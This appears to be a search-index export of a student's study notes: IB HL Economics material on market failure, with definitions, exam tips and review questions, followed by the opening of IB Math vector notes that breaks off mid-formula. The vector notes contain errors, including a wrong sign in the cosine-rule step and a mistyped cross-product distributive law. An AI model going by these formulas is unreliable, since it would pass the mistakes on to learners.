Merit Good Goods or services that are beneficial to consumers and also beneficial to society when consumed. Merit goods are often underproduced. Underground Market / Black Market An illegal market in which a good/service is sold at a higher price, somewhere between the price ceiling and the equilibrium price. Quota A quota is a quantity restriction on the amount of goods that can be produced in a market. Market Failure Market prices fail to reflect all the costs and benefits involved in transactions and thus the market cannot reach allocative efficiency. Externalities When some costs or benefits associated with the production or consumption of a good/service \"spill over\" to third parties who do not produce or pay to consume the good/service. Positive Externality A type of externality where benefits are enjoyed by someone who doesn't pay to consume or produce a good or service. Negative Externality A type of externality where costs are paid by someone who doesn't produce or pay to consume a product or service. Marginal Private Cost (MPC) The cost to producers of producing one more unit of a good or service Marginal Social Cost (MSC) The cost to society of producing one more unit of a good or service. MSC includes production and external cost. Marginal Private Benefit (MPB) The benefit to consumers from consuming 1 more unit of a good or service. Marginal Social Benefit (MSB) The benefit to society from consuming 1 more unit of a good or service. Social Optimum/Allocative Efficiency The state of the market when all costs and benefits are aligned. Demerit Goods Demerit goods are goods that are undesirable for consumers and society but over provided by the market. Common Pool Resources Natural resources that are non-excludable and rival. Non-excludable One cannot reasonably or cost effectively prevent someone else from using a resource. Rival A situation where one party's use of the good diminishes another parties ability to use it. Sustainability Maintaining the ability of the environment and the economy to continue to produce and satisfy the needs and wants of future generations. Public Good Goods that are to become freely available to all or where it would be difficult to prevent non-payers from using. Asymmetric Information Refers to a situation when one party to an economic transaction possesses greater material knowledge than the other party. Adverse Selection The situation where sellers select who to provide a good or service to due to asymmetric information. Moral Hazard Moral hazard is a situation in which one party gets involved in a risky event knowing that it is protected against the risk and the other party will incur the cost. It arises when both the parties have incomplete information about each other. Paper 2 Writing Tips \u00b6 Data response test \u2192 Newspaper articles, readings etc. Question 1 \u00b6 4 marks 5 min \ud83d\ude04 1 or 2 sentences maximum for full marks. A vague definition for 1 mark \ud83d\udcc9 A precise definition for 2 marks \ud83d\udcc8 Question 2 & 3 \u00b6 8 marks total, 4 each \ud83d\ude0d Diagram + written response (explaining the diagram and analyzing). \ud83d\ude21 Always read the text before responding referring to the diagram and text. \" Using a market failure diagram , illustrate and explain how the vaccines market can be an example of market failure\" Question 4 \u00b6 8 marks \ud83e\udd75 Evaluate + Synthesis To evaluate: Have a conclusion statement, paragraph form. Conclusion should \"weigh\" the evidence (show both sides). \"On the one hand\u2026, on the other hand\u2026, overall\u2026\" Look at: Stakeholders Pros/cons Short run/long run Priorities ALWAYS : Refer to paragraph numbers from the text Quote from the text Review Questions \u00b6 Discuss the significance of price elasticity of demand (PED) for a government imposing an indirect tax on a good. Explain two reasons why a government might impose an indirect tax on a good. Evaluate the impact that an increase in indirect tax might have on consumers and producers. A government decides to impose an indirect tax on unhealthy drinks. Discuss the consequences for the stakeholders in these markets. Discuss the view that governments should tax the consumption of gasoline (petroleum). Explain how the incidence of an indirect tax depends on the price elasticity of demand and the price elasticity of supply. Discuss the consequences of imposing an indirect tax on unhealthy food. Explain why a government might decide to impose an indirect tax on the consumption of cigarettes. Discuss the possible consequences of the imposition of an indirect tax on cigarettes for the different stakeholders in the market. Discuss the consequences of the introduction of an indirect tax on gasoline (petrol) for consumers, producers and the government. Explain two reasons why governments impose indirect taxes. Discuss the consequences for consumers, producers and the government of imposing a specific tax on cigarettes. Explain why governments impose indirect taxes. Using diagrams, explain how the incidence of an indirect tax may be affected by the price elasticity of demand. Discuss the view that the provision of subsidies by the government on goods such as agricultural products will always be beneficial to stakeholders. Explain two reasons why a government might want to subsidise a good or service. Explain why governments provide subsidies for some goods and services. Discuss the consequences of providing a subsidy for goods such as agricultural products Discuss the consequences for different stakeholders in the economy of the government providing subsidies on goods, such as renewable energy. Explain two reasons why governments might subsidise basic food such as wheat. Discuss the consequences for the government and for consumers of subsidising the price of admission to museums. Discuss the consequences of providing a subsidy on the production of rice for producers, consumers and the government. Explain why a government might decide to impose a price ceiling on goods and services such as essential foods or rented housing. Discuss the view that price controls imposed by governments on the market for rented housing should never be used. Explain why governments impose price floors (minimum prices) Discuss the consequences for producers, consumers and the government of imposing a price floor (minimum price) on a good. Discuss the impact on different stakeholders of governments using price floors (minimum prices) to support farmers when agricultural prices are falling. Examine the possible consequences of governments imposing a price ceiling in the market for rented housing. Discuss possible consequences of a government imposing a price floor on an agricultural product. Using a price ceiling diagram, analyse the impact a maximum price might have on the market for food. Explain why a government might impose a price ceiling on the market for rented accommodation and a price floor on the market for agricultural products. Evaluate the possible consequences of price controls on the stakeholders in a market. Discuss the view that governments should not intervene in housing markets. Discuss the policies a government might use to make food more affordable to low income groups. Examine the view that the best allocation of resources, from a society's point of view, occurs where the marginal private benefit equals the marginal private cost. Discuss the view that competitive markets will always achieve allocative efficiency. Discuss the view that a free market at competitive market equilibrium leads to the most efficient allocation of resources from society's point of view. Negative externalities of production and consumption Using an appropriate externalities diagram, explain why a government might decide to impose a price floor on a demerit goods. Evaluate the view that the most effective way in which the government can discourage the consumption of demerit goods is through government regulations. Discuss the view that imposing an indirect tax on gasoline (petrol) is the most effective way of reducing the market failure caused by cars. Evaluate the view that the use of regulation is the most effective way to reduce negative externalities. Explain why demerit goods are an example of market failure. Evaluate the effectiveness of using indirect taxation to correct market failure. Evaluate the view that regulations are the most effective government response to the market failure of negative externalities. Evaluate the view that the market failure caused by the consumption of demerit goods is best dealt with through the use of taxation. Discuss three policies a government might use to reduce the consumption of a demerit good such as cigarettes. Using a diagram, explain why demerit goods are considered to be an example of market failure. Evaluate two possible government responses that could be used to address the problem of demerit goods. To what extent might the problems of negative externalities of consumption be resolved by the use of indirect taxation? Positive externalities of production and consumption Evaluate the view that the most effective way in which the government can encourage the consumption of merit goods is through direct provision. Explain why public transport, such as buses and trains, might be under-provided in a market economy. To what extent is advertising the most effective way of increasing the consumption of merit goods? Explain why the consumption of merit goods, such as healthy food, can lead to positive externalities of consumption. Discuss whether advertising by the government is the most appropriate way of increasing consumption of a merit good. Explain why the under-consumption of merit goods causes market failure. To what extent are subsidies the most effective way of encouraging the consumption of merit goods? Analyse the private and external benefits associated with the consumption of university education. Explain the policies a government might use to increase the consumption of university education. Analyse the consumption externalities which might arise from the provision of education and healthcare for the citizens of a country. Evaluate the use of government policies to increase the consumption of healthcare. Discuss the implications of the direct provision of public goods by a government. Discuss the consequences of the direct provision of public goods by the government. Discuss whether there should always be direct provision of public goods by the government. Explain why the exploitation of common access resources, such as uncontrolled fishing, might pose a threat to sustainability. Evaluate whether the use of carbon taxes is the most effective way for the government to deal with the threat to sustainability posed by the use of fossil fuels. Explain how the overuse of common access resources can lead to negative externalities Discuss the view that the best way to reduce the threat to sustainability, arising from the burning of fossil fuels, is for the government to provide subsidies to firms that produce energy through renewable resources. Examine the consequences of the lack of a pricing mechanism for common access resources. Discuss the view that the overuse of common access resources is best addressed by the government. Discuss two possible government responses to threats to sustainability. Explain why common access resources, such as fishing grounds, might become depleted in the absence of a price mechanism. Explain why monopoly power may be considered a type of market failure. Discuss the view that legislation is the best way of dealing with the problem of monopoly power. Oligopolists often possess too much monopoly power. Evaluate whether governments should intervene in oligopolistic markets. Explain two possible government responses to the abuse of monopoly power. Explain how welfare loss may result from monopoly power. Discuss the effectiveness of government policies (legislation and regulation) to reduce monopoly power. Market failure can occur when there is asymmetric information, abuse of monopoly power and positive externalities. Explain why any two of these represent market failure.","title":"Market Failure"},{"location":"IB/HL%20Economics/market_failure/#market-failure","text":"Notes, Key Points, Paper 2 Tips & Sample Questions","title":"Market Failure"},{"location":"IB/HL%20Economics/market_failure/#summarized-notes","text":"","title":"Summarized Notes"},{"location":"IB/HL%20Economics/market_failure/#taxes-subsidies","text":"","title":"Taxes &amp; Subsidies"},{"location":"IB/HL%20Economics/market_failure/#taxes","text":"Governments impose indirect tax to create government revenue, discourage consumption of certain demerit goods, to redistribute income and a method of improving the allocation of resources. When a specific tax is imposed, consumers pay more and consume less. Producers receive less revenue and sell less products/services. The government receives tax revenue and workers receive lower wages due to reduced total producer revenue. Society as a whole loses allocating efficiency. However, it can be compensated.","title":"Taxes"},{"location":"IB/HL%20Economics/market_failure/#subsidies","text":"Governments provide subsidies for three main reasons: Lower price of an essential good, guarantee supplies that are necessary and enable producers to compete with overseas trade. When evaluating a subsidy, the opportunity cost from providing other firms subsidies, damage done to foreign producers, players paying taxes and the efficiency/decreased incentive created.","title":"Subsidies"},{"location":"IB/HL%20Economics/market_failure/#price-controls","text":"","title":"Price Controls"},{"location":"IB/HL%20Economics/market_failure/#price-ceilings","text":"Governments impose price ceilings to help consumers obtain necessity and merit goods at a cheaper price. There can be consequences caused by price ceilings aside from a shortage in the market. Price ceilings can create an underground market, create queues for producers and cause unfairness in distribution of limited goods. When a price ceiling is imposed, consumers partly gain and partly lose where some consumers gain extra surplus by purchasing the product at a lower price. However, the shortage caused other consumers to have no access at all to the product or service and remain unsatisfied. Society experiences a loss in allocating efficiency (deadweight loss). Workers might get fired due to a reduction of quantity supplied and loss in total producer revenue. Governments do not gain nor lose economically but can gain political popularity amongst consumers who benefitted. To eliminate or reduce the shortage caused by a price ceiling governments can: find ways to reduce demand for a product but this limits the consumption of a product, find ways to increase the supply of the product through subsidies and direct provision.","title":"Price Ceilings"},{"location":"IB/HL%20Economics/market_failure/#price-floors","text":"Price floors are imposed to raise income for producers of goods and services that the government thinks are important and to protect workers by setting a minimum wage that ensures they can live a reasonable life. Some examples of price floors are minimum wages for workers, minimum prices for agricultural goods and minimum prices for alcohol. Price floors will create inefficiency due to a surplus. Governments can use the following four ways to address the surplus: buying up the surplus (store, destroy or sell to other countries), increasing demand through advertising, restricting overseas imports or imposing a producer quota. A minimum wage is a type of price floor, the minimum price for a market of a factor of production: labour. A minimum wage can increase income for low-paid workers, increase labour productivity, offset employer power-imbalance and increase incentive for people to enter the labour market. However, a minimum wage can cause unemployment in competitive markets, encourage the creation of informal/illegal labour markets, destruction of small businesses and higher prices for firms to pass on to consumers.","title":"Price Floors"},{"location":"IB/HL%20Economics/market_failure/#negative-positive-externalities","text":"When society doesn't take into account externalities, it leads to market failure.","title":"Negative &amp; Positive Externalities"},{"location":"IB/HL%20Economics/market_failure/#negative-externalities","text":"Negative externalities of production is a cost that is suffered by a third party as a result of production of a good or service. An example would be the production of steel where toxic chemicals are produced for society. When negative externalities of production are not recognized, an overproduction of that good or service will cause allocating inefficiency or welfare loss. There will be two optimums: the market equilibrium and the social equilibrium where it's the social optimum. In this situation, no party can benefit more without harming another by changing its production/consumption. Solutions to negative production externalities are government regulation for producers, indirect taxations or a market for the externality. Tradable permits can be issued to firms to create a market for pollution. This creates a quota for each firm on their pollution and incentives firms to pollute less since permits can be sold for money. Negative externalities of consumption happen on the consumer side where consumers harm others by consuming more of a product or service, such as smoking. An overconsumption will happen and cause deadweight loss which leads to allocative inefficiency. In the case of demerit goods, they are overproduced by the market and over-consumed by consumers because they often have unrecognized negative externalities of consumption and people just don't care about the harmful effects upon themselves and others. To combat negative consumption externalities, governments can create legislation banning or reducing consumption, imposing taxes for certain demerit goods, provide education/advertisement to society or use consumer nudges to make consumers voluntarily reduce consumption.","title":"Negative Externalities"},{"location":"IB/HL%20Economics/market_failure/#positive-externalities","text":"Positive externalities is when the side-effect on a third party that's not a producer or a consumer that pays to consume a product or service is beneficial. When a firm produces a good or service and there is a positive benefit to third parties such as society a positive externality of production is present. This often leads to a situation where the cost to the private individuals is higher than the cost to society and creates an underproduction of said product or service which leads to deadweight loss or potential welfare gain. To combat positive externalities of production, governments can directly provide the good or service through direct provision or provide subsidies to firms. Positive externalities of consumption are benefits to third parties when a good or service is consumed. This leads to a situation where the benefit to society is greater than the benefit to the private consumer thus an under-consumption often happens. This also causes deadweight loss or potential welfare gain. In the case of merit goods, they are often services that benefit society as a whole more than the consumer such as education, healthcare, sport facilities etc. They are often under consumed because of a lack of recognition, low levels of income and poverty and blatant consumer ignorance. To combat positive externalities of consumption, governments can create legislation to consume more, positive advertising, direct government provision for certain products or services or subsidies.","title":"Positive Externalities"},{"location":"IB/HL%20Economics/market_failure/#common-pool-resources-public-goods","text":"","title":"Common Pool Resources &amp; Public Goods"},{"location":"IB/HL%20Economics/market_failure/#common-pool-resources","text":"Common pool resources are non-excludable and rival and that's why the main consequence in the absence of government intervention is resource degradation. Common pool resources are very susceptible to negative externalities (both production and consumption) because they are non-excludable so overconsumption/overproduction will occur. The tragedy of the commons refers to the consequences of non-excludability of common resources. When a party simply \"losses\" in self-interest if one does not consume more of a common pool resource which causes exhaustion of limited resources. The free rider problem is when parties consider society as a whole and do not act upon self-interest, other \"free riders\" will simply consume/produce more of the common pool resources with no consequences. To combat the tragedy of the commons International agreements, tradable permits, carbon taxes, legislation/regulations, subsidies and collective self governance are often used.","title":"Common Pool Resources"},{"location":"IB/HL%20Economics/market_failure/#public-goods","text":"Public goods often cause market failure because there is no profit incentive and usually can't be provided by any market. Some examples are street lights, breathable air, lighthouses and national defense. Public goods have two key characteristics of being non-excludable and non-rival. One cannot reasonably stop another from using the resource and when one person uses the good, others can still use the good. To combat the issue of public goods, governments often resort to direct provision or heavy subsidies or work in partnership with firms in the private sector.","title":"Public Goods"},{"location":"IB/HL%20Economics/market_failure/#asymmetric-information","text":"Asymmetric information refers to a situation when one party to an economic transaction possesses greater material knowledge than the other party. Asymmetric information often causes market failure due to two reasons: Uncertainty of the buyer will drive prices down across the whole market. This will further cause the market to collapse and no trade will occur at any price point. Due to asymmetric information, when consumers know more than the producers, there will be a selection of who to provide a good/service to, or there will be a price raise since consumers who need the good/service to will use it more (ie. less healthy people and health insurance) An example of adverse selection would be insurance companies choosing who to sell their product to or creating unreasonable prices for people who the company thinks is not safe to sell the product in an attempt to scare them away from purchasing. The most important way to combat asymmetric information is signalling. For example sellers are required to tell buyers the condition of each car, life insurance companies require customers to do health checkups before selling them products etc. Moral hazards are situations where one person is trying to get another person to behave in a certain way but if the first person cannot observe the second person's work and the second person needs to put effort into said work, the second person can simply avoid work. Both moral hazards and adverse selection can cause market failure. In the case of adverse selection, the market failure occurs before an economic transaction has been made. One party has more information than the other, and this gives the party an advantage going into the transaction. In the case of moral hazard, the market failure occurs after the economic transaction has been made. The party with greater knowledge of the risk has the advantage following the transaction.","title":"Asymmetric Information"},{"location":"IB/HL%20Economics/market_failure/#definitions-list","text":"Indirect Tax Tax imposed on spending to buy goods and services. Paid by the producer (firms) but are partially passed to the consumer. Excise Taxes Tax on a specific good and services Specific Taxes A type of excise tax of a fixed dollar amount Ad Valorem Taxes A type of excise tax of a fixed percentage amount General Taxes Taxes on all (or most) goods and services Subsidy An amount of money paid by the government to a firm, per unit output, to increase output and lower price. Price Controls A minimum or maximum price set by the government such that prices are unable to adjust to equilibrium level Price Ceilings A maximum price for a good or service set by the government Price Floors A minimum price for a good or service set by the government Merit Good Goods or services that are beneficial to consumers and also beneficial to society when consumed. Merit goods are often underproduced. Underground Market / Black Market An illegal market in which a good/service is sold at a higher price, somewhere between the price ceiling and the equilibrium price. Quota A quota is a quantity restriction on the amount of goods that can be produced in a market. Market Failure Market prices fail to reflect all the costs and benefits involved in transactions and thus the market cannot reach allocative efficiency. Externalities When some costs or benefits associated with the production or consumption of a good/service \"spill over\" to third parties who do not produce or pay to consume the good/service. Positive Externality A type of externality where benefits are enjoyed by someone who doesn't pay to consume or produce a good or service. Negative Externality A type of externality where costs are paid by someone who doesn't produce or pay to consume a product or service. Marginal Private Cost (MPC) The cost to producers of producing one more unit of a good or service Marginal Social Cost (MSC) The cost to society of producing one more unit of a good or service. MSC includes production and external cost. Marginal Private Benefit (MPB) The benefit to consumers from consuming 1 more unit of a good or service. Marginal Social Benefit (MSB) The benefit to society from consuming 1 more unit of a good or service. Social Optimum/Allocative Efficiency The state of the market when all costs and benefits are aligned. Demerit Goods Demerit goods are goods that are undesirable for consumers and society but over provided by the market. Common Pool Resources Natural resources that are non-excludable and rival. Non-excludable One cannot reasonably or cost effectively prevent someone else from using a resource. Rival A situation where one party's use of the good diminishes another parties ability to use it. Sustainability Maintaining the ability of the environment and the economy to continue to produce and satisfy the needs and wants of future generations. Public Good Goods that are to become freely available to all or where it would be difficult to prevent non-payers from using. Asymmetric Information Refers to a situation when one party to an economic transaction possesses greater material knowledge than the other party. Adverse Selection The situation where sellers select who to provide a good or service to due to asymmetric information. Moral Hazard Moral hazard is a situation in which one party gets involved in a risky event knowing that it is protected against the risk and the other party will incur the cost. It arises when both the parties have incomplete information about each other.","title":"Definitions List"},{"location":"IB/HL%20Economics/market_failure/#paper-2-writing-tips","text":"Data response test \u2192 Newspaper articles, readings etc.","title":"Paper 2 Writing Tips"},{"location":"IB/HL%20Economics/market_failure/#question-1","text":"4 marks 5 min \ud83d\ude04 1 or 2 sentences maximum for full marks. A vague definition for 1 mark \ud83d\udcc9 A precise definition for 2 marks \ud83d\udcc8","title":"Question 1"},{"location":"IB/HL%20Economics/market_failure/#question-2-3","text":"8 marks total, 4 each \ud83d\ude0d Diagram + written response (explaining the diagram and analyzing). \ud83d\ude21 Always read the text before responding referring to the diagram and text. \" Using a market failure diagram , illustrate and explain how the vaccines market can be an example of market failure\"","title":"Question 2 &amp; 3"},{"location":"IB/HL%20Economics/market_failure/#question-4","text":"8 marks \ud83e\udd75 Evaluate + Synthesis To evaluate: Have a conclusion statement, paragraph form. Conclusion should \"weigh\" the evidence (show both sides). \"On the one hand\u2026, on the other hand\u2026, overall\u2026\" Look at: Stakeholders Pros/cons Short run/long run Priorities ALWAYS : Refer to paragraph numbers from the text Quote from the text","title":"Question 4"},{"location":"IB/HL%20Economics/market_failure/#review-questions","text":"Discuss the significance of price elasticity of demand (PED) for a government imposing an indirect tax on a good. Explain two reasons why a government might impose an indirect tax on a good. Evaluate the impact that an increase in indirect tax might have on consumers and producers. A government decides to impose an indirect tax on unhealthy drinks. Discuss the consequences for the stakeholders in these markets. Discuss the view that governments should tax the consumption of gasoline (petroleum). Explain how the incidence of an indirect tax depends on the price elasticity of demand and the price elasticity of supply. Discuss the consequences of imposing an indirect tax on unhealthy food. Explain why a government might decide to impose an indirect tax on the consumption of cigarettes. Discuss the possible consequences of the imposition of an indirect tax on cigarettes for the different stakeholders in the market. Discuss the consequences of the introduction of an indirect tax on gasoline (petrol) for consumers, producers and the government. Explain two reasons why governments impose indirect taxes. Discuss the consequences for consumers, producers and the government of imposing a specific tax on cigarettes. Explain why governments impose indirect taxes. Using diagrams, explain how the incidence of an indirect tax may be affected by the price elasticity of demand. Discuss the view that the provision of subsidies by the government on goods such as agricultural products will always be beneficial to stakeholders. Explain two reasons why a government might want to subsidise a good or service. Explain why governments provide subsidies for some goods and services. Discuss the consequences of providing a subsidy for goods such as agricultural products Discuss the consequences for different stakeholders in the economy of the government providing subsidies on goods, such as renewable energy. Explain two reasons why governments might subsidise basic food such as wheat. Discuss the consequences for the government and for consumers of subsidising the price of admission to museums. Discuss the consequences of providing a subsidy on the production of rice for producers, consumers and the government. Explain why a government might decide to impose a price ceiling on goods and services such as essential foods or rented housing. Discuss the view that price controls imposed by governments on the market for rented housing should never be used. Explain why governments impose price floors (minimum prices) Discuss the consequences for producers, consumers and the government of imposing a price floor (minimum price) on a good. Discuss the impact on different stakeholders of governments using price floors (minimum prices) to support farmers when agricultural prices are falling. Examine the possible consequences of governments imposing a price ceiling in the market for rented housing. Discuss possible consequences of a government imposing a price floor on an agricultural product. Using a price ceiling diagram, analyse the impact a maximum price might have on the market for food. Explain why a government might impose a price ceiling on the market for rented accommodation and a price floor on the market for agricultural products. Evaluate the possible consequences of price controls on the stakeholders in a market. Discuss the view that governments should not intervene in housing markets. Discuss the policies a government might use to make food more affordable to low income groups. Examine the view that the best allocation of resources, from a society's point of view, occurs where the marginal private benefit equals the marginal private cost. Discuss the view that competitive markets will always achieve allocative efficiency. Discuss the view that a free market at competitive market equilibrium leads to the most efficient allocation of resources from society's point of view. Negative externalities of production and consumption Using an appropriate externalities diagram, explain why a government might decide to impose a price floor on a demerit goods. Evaluate the view that the most effective way in which the government can discourage the consumption of demerit goods is through government regulations. Discuss the view that imposing an indirect tax on gasoline (petrol) is the most effective way of reducing the market failure caused by cars. Evaluate the view that the use of regulation is the most effective way to reduce negative externalities. Explain why demerit goods are an example of market failure. Evaluate the effectiveness of using indirect taxation to correct market failure. Evaluate the view that regulations are the most effective government response to the market failure of negative externalities. Evaluate the view that the market failure caused by the consumption of demerit goods is best dealt with through the use of taxation. Discuss three policies a government might use to reduce the consumption of a demerit good such as cigarettes. Using a diagram, explain why demerit goods are considered to be an example of market failure. Evaluate two possible government responses that could be used to address the problem of demerit goods. To what extent might the problems of negative externalities of consumption be resolved by the use of indirect taxation? Positive externalities of production and consumption Evaluate the view that the most effective way in which the government can encourage the consumption of merit goods is through direct provision. Explain why public transport, such as buses and trains, might be under-provided in a market economy. To what extent is advertising the most effective way of increasing the consumption of merit goods? Explain why the consumption of merit goods, such as healthy food, can lead to positive externalities of consumption. Discuss whether advertising by the government is the most appropriate way of increasing consumption of a merit good. Explain why the under-consumption of merit goods causes market failure. To what extent are subsidies the most effective way of encouraging the consumption of merit goods? Analyse the private and external benefits associated with the consumption of university education. Explain the policies a government might use to increase the consumption of university education. Analyse the consumption externalities which might arise from the provision of education and healthcare for the citizens of a country. Evaluate the use of government policies to increase the consumption of healthcare. Discuss the implications of the direct provision of public goods by a government. Discuss the consequences of the direct provision of public goods by the government. Discuss whether there should always be direct provision of public goods by the government. Explain why the exploitation of common access resources, such as uncontrolled fishing, might pose a threat to sustainability. Evaluate whether the use of carbon taxes is the most effective way for the government to deal with the threat to sustainability posed by the use of fossil fuels. Explain how the overuse of common access resources can lead to negative externalities Discuss the view that the best way to reduce the threat to sustainability, arising from the burning of fossil fuels, is for the government to provide subsidies to firms that produce energy through renewable resources. Examine the consequences of the lack of a pricing mechanism for common access resources. Discuss the view that the overuse of common access resources is best addressed by the government. Discuss two possible government responses to threats to sustainability. Explain why common access resources, such as fishing grounds, might become depleted in the absence of a price mechanism. Explain why monopoly power may be considered a type of market failure. Discuss the view that legislation is the best way of dealing with the problem of monopoly power. Oligopolists often possess too much monopoly power. Evaluate whether governments should intervene in oligopolistic markets. Explain two possible government responses to the abuse of monopoly power. Explain how welfare loss may result from monopoly power. Discuss the effectiveness of government policies (legislation and regulation) to reduce monopoly power. Market failure can occur when there is asymmetric information, abuse of monopoly power and positive externalities. Explain why any two of these represent market failure.","title":"Review Questions"},{"location":"IB/HL%20Math%20AA/vectors/","text":"Vectors \u00b6 A vector is a mathematical way to describe a \"journey\" with two components: a magnitude and a direction . As opposed to a scaler value which only has a magnitude. A vector can be represented using directed line segments where the length shows the magnitude and the arrow indicates the direction. Two vectors are the same only when they have the same magnitude and direction. A negative of a vector is a vector parallel, same length but opposite in direction denoted as \\(-\\vec{a}\\) Vector Addition \u00b6 Vector addition is Head-to-Tail where one vector is place at the end of another. The resultant vector starts from the start of the first vector and ends at the end of the second vector. Vector Subtraction \u00b6 Vector subtraction can be considered Tail-to-Tail but you can also find the negated value of the second vector and do vector addition . Scalar Multiplication \u00b6 Scalar multiplication is multiplying a scalar value to a vector. It multiplies the magnitude of the vector of the scalar amount and changes the direction if the scalar is negative. Representing Vectors in a Plane \u00b6 Notation \u00b6 Unit vector : A normalized vector of magnitude 1 Position Vector : The position vector of point P is a vector originating from the origin and ending at point P(x,y). Displacement Vector : The displacement vector of B relative to A \\(\\vec{AB}\\) is a vector that originates from A and terminates at B. Vectors are often denoted using a lower case letter with a hat like such \\(\\vec{a}\\) or the two points the vector originates and ends at like \\(\\vec{AB}\\) Vectors on a plane can also be represented as the two components like such: \\[ \\begin{bmatrix} x \\\\ y \\\\ \\end{bmatrix} = xi+yj \\] Where \\(i\\) is the x unit vector \\(\\begin{bmatrix} 1 \\\\ 0 \\\\ \\end{bmatrix}\\) and \\(j\\) is the y unit vector \\(\\begin{bmatrix} 0 \\\\ 1 \\\\ \\end{bmatrix}\\) . Generally we can represent a vector as \\(\\begin{bmatrix} x \\\\ y \\\\ \\end{bmatrix}\\) where \\(x\\) is the horizontal component and \\(y\\) is the vertical component of the vector. The magnitude or length of that vector is written as \\(|\\vec{AB}|\\) or \\(|\\vec{a}|\\) . It's found using formula: \\[ \\sqrt{{a_1}^2+{a_2}^2+...+{a_n}^2} \\] where \\(a_n\\) is each component of the vector. Operations \u00b6 If \\(a=\\left(\\begin{array}{l}a_{1} \\\\ a_{2}\\end{array}\\right)\\) and \\(\\mathbf{b}=\\left(\\begin{array}{l}b_{1} \\\\ b_{2}\\end{array}\\right)\\) then \\(\\mathbf{a}+\\mathbf{b}=\\left(\\begin{array}{l}a_{1}+b_{1} \\\\ a_{2}+b_{2}\\end{array}\\right)\\) If \\(\\mathbf{a}=\\left(\\begin{array}{l}a_{1} \\\\ a_{2}\\end{array}\\right)\\) and \\(\\mathbf{b}=\\left(\\begin{array}{l}b_{1} \\\\ b_{2}\\end{array}\\right)\\) , then \\(\\mathbf{a}-\\mathbf{b}=\\left(\\begin{array}{l}a_{1}-b_{1} \\\\ a_{2}-b_{2}\\end{array}\\right)\\) If \\(k\\) is any scalar and \\(\\mathbf{v}=\\left(\\begin{array}{l}v_{1} \\\\ v_{2}\\end{array}\\right)\\) , then \\(k \\mathbf{v}=\\left(\\begin{array}{l}k v_{1} \\\\ k v_{2}\\end{array}\\right)\\) Scalar Product & Angle Between Two Vectors \u00b6 The scalar product of two vectors is also knows as the dot product or inner product. It's found by multiplying each of a vectors compoments and summing them up like such: \\[ \\left(\\begin{array}{l} a_{1} \\\\ a_{2} \\\\ a_{3} \\end{array}\\right) \\cdot\\left(\\begin{array}{l} b_{1} \\\\ b_{2} \\\\ b_{3} \\end{array}\\right)=a_{1} b_{1}+a_{2} b_{2}+a_{3} b_{3} \\] The angle between two vectors \\(\\theta\\) is the angle between two vectors, we can find the angle using the cosine rule: \\[ |b-a|^2 = |a|^2 + |b|^2 + 2 |a||b|\\cos{\\theta} \\\\ \\cos{\\theta} = \\frac{a\\cdot b}{|a||b|} \\] Note: Vectors must be converging or diverging from the same point to have an angle between them Implications \u00b6 The implications of the dot product indicates how close the two vectors are. In this case: \\[ \\begin{aligned} \\vec{a}\\cdot \\vec{b}=0,\\ \\cos \\theta =0,\\ \\theta =90^{\\circ }\\\\ \\vec{a}\\cdot \\vec{b}=\\left| a\\right| \\left| b\\right| ,\\ \\cos \\theta =1,\\ \\theta =0\\\\ \\vec{a}\\cdot \\vec{b} >0, \\cos \\theta >0\\\\ \\vec{a}\\cdot \\vec{b} <0, cos\\theta <0 \\end{aligned} \\] As shown, if the dot product of the two vectors equal to 0, they are perpendicular to each other. If the dot product is equal to the two magnitudes of the vectors, they are parallel. If the product is greater than 0, the angle os acute and if they are less than 0, they angle between them is obtuse. Vector Product \u00b6 The vector product or the cross product is only defined for 3-dimensional vectors. The vector product or the cross products results in a vector which is perpendicular to the two known vectors. \\[ a=\\begin{bmatrix} a_{1} \\\\ a_{2} \\\\ a_{3} \\end{bmatrix},b=\\begin{bmatrix} b_{1} \\\\ b_{2} \\\\ b_{3} \\end{bmatrix},a\\times b=\\begin{bmatrix} a_{2}b_{3}-a_{3}b_{2} \\\\ a_{3}b_{1}-a_{1}b_{3} \\\\ a_{1}b_{2}-a_{2}b_{1} \\end{bmatrix} \\] An easy way to remember the operation is split into 3 steps: Cover row 1 and start a cross with the remaining 4 elements of the two vectors. Start from Upper Left. Find the difference between the two products of the cross (starting from upper left) Cover row two and invert cross with remaining 4 elements. Starting from Bottom Left. Find difference. Cover row 3 and return to starting from Upper Left when drawing the cross. Find the difference. Properties of the Cross Product \u00b6 \\(a\\times b\\) is a vector perpendicular to \\(a\\) and \\(b\\) \\(a\\times a=0\\) for all \\(a\\) \\(a\\times b = (-b)\\times a\\) for all \\(a\\) and \\(b\\) \\(a\\cdot (b\\times c)\\) is the scalar triple product \\(a\\times (b+b)=a\\times b+a\\times c\\) \\(\\left( a+b\\right) \\times \\left( c+d\\right) =a\\times c+a\\times d+b\\times c+b\\times d\\) Geometric Interpretation \u00b6 Using the cross product, we can find the area of a trangle or parallelogram without knwoing the angle between the two vectors due to: \\[ |a\\times b| = |a||b|\\sin(\\theta) \\] where we know the area of a traingle is \\(\\frac{1}{2}ab\\sin(\\theta)\\) thus the area of a trangle and a parallegorm is found. Vector Lines \u00b6 Recall : the equation of a line is defined as \\(y=mx+b\\) where \\(m\\) defines the slope and \\(b\\) defines the position A similar process can be done using vectors where one vector defines the \"slope\" or the direction and another positional vector shows the position. Suppose a line passes through a fixed point A with position vector \\(\\vec{a}\\) and the line is parallel to the vector \\(\\vec{b}\\) . Now consider a point \\(R\\) on that line with a position vector \\(\\vec{r}\\) . By vector addition, we know that \\(\\vec{r}=\\vec{a}+\\vec{AR}\\) Since \\(\\vec{AR}\\) is parallel to \\(\\vec{b}\\) we can say that \\[ \\vec{AR}=\\lambda \\vec{b} \\] Where \\(\\lambda \\epsilon \\mathbb{R}\\) is some scalar multiple. Thus \\[ \\vec{r} = \\vec{a} + \\lambda \\vec{b},\\ \\lambda \\epsilon \\mathbb{R} \\] is the vector equation for a line. Here vector \\(a\\) represents a position and vector \\(b\\) defines the direction. The vector equation fo a line is not unique. Any position vector of a point on the line can be used as the position vector \\(\\vec{a}\\) and any vector parallel can be the direction vector \\(\\vec{b}\\) . In conclusion, using the vector equation of a line, we can plug in any lambda and it will generate points on the line. Different Forms of Representing Vector Lines \u00b6 Vector Equation \u00b6 \\[ \\begin{pmatrix} x \\\\ y \\\\ z \\end{pmatrix}=\\begin{pmatrix} a_{1} \\\\ a_{2} \\\\ a_{3} \\end{pmatrix}+\\lambda \\begin{pmatrix} b_{1} \\\\ b_{2} \\\\ b_{3} \\end{pmatrix} \\] Parametric Equation \u00b6 \\[ \\begin{cases}x=a_{1}+\\lambda b_{1}\\\\ y=a_{2}+\\lambda b_{2}\\\\ 